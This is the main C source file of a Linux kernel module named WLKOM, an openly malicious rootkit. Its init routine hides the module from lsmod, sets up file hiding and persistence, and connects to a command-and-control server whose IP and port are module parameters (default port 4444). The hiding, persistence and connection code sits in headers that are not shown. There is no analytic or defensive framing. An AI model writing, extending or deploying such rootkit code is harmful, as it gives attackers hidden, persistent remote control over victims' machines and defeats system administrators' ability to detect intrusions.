#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include "hide.h"
#include "connect.h"
#include "persist.h"

#define WLKOM_VERSION "1.0.0"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("WLKOM Team");
MODULE_DESCRIPTION("Wild Linux Kernel Object Module");
MODULE_VERSION(WLKOM_VERSION);

/* ─── Module parameters ─── */
static char c2_ip[64] = "127.0.0.1";
static int c2_port = 4444;

module_param_string(c2_ip, c2_ip, sizeof(c2_ip), 0644);
MODULE_PARM_DESC(c2_ip, "C2 server IP address");

module_param(c2_port, int, 0644);
MODULE_PARM_DESC(c2_port, "C2 server port");

static int __init wlkom_init(void)
{
    int ret;
    
    pr_info("WLKOM: module loading...\n");
    pr_info("WLKOM: C2 IP = %s, Port = %d\n", c2_ip, c2_port);

    /* Initialize hiding FIRST */
    ret = hide_init();
    if (ret < 0) {
        pr_err("WLKOM: failed to initialize hiding\n");
        return ret;
    }

    /* Hide the module from lsmod */
    hide_module();

    /* Initialize persistence (which uses hide_file/hide_line) */
    ret = persist_init();
    if (ret < 0) {
        pr_err("WLKOM: failed to initialize persistence\n");
        hide_exit();
        return ret;
    }

    /* Initialize connection to C2 */
    ret = connect_init(c2_ip, c2_port);
    if (ret < 0) {
        pr_err("WLKOM: failed to initialize connection\n");
        persist_exit();
        hide_exit();
        return ret;
    }

    pr_info("WLKOM: module loaded successfully\n");
    return 0;
}

static void __exit wlkom_exit(void)
{
    pr_info("WLKOM: module unloading...\n");
    
    connect_exit();
    persist_exit();
    hide_exit();
    
    pr_info("WLKOM: module unloaded\n");
}

module_init(wlkom_init);
module_exit(wlkom_exit);
